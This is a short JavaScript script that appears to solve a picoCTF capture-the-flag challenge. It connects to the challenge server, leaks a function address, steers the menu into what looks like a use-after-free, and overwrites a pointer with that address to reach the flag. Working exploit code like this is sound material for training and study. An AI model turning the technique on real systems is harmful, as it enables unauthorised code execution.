import convo from "../convo.js";
import nc from "../nc.js";

import "../util.js";
import { printf } from "../util.js";


const cat = new nc("nc mercury.picoctf.net 61817");

await cat.open;

async function menu(code) {
    await cat.readUntil("===");
    await cat.write(code + "\n");
}

await menu("S");
await cat.readUntil("...");
const text = (await cat.readline()).trim();
const shellAddr = parseInt(text) // constant but whatever
printf("[+] shell addr leak %p\n", shellAddr)
await menu("I");
await cat.readUntil("Y/N)")
await cat.write("Y\n");
await menu("l");
await cat.write(convo.raw([shellAddr, shellAddr]));
await cat.readUntil("try anyways:\n");

printf("[!] " + await cat.readline());

await cat.kill();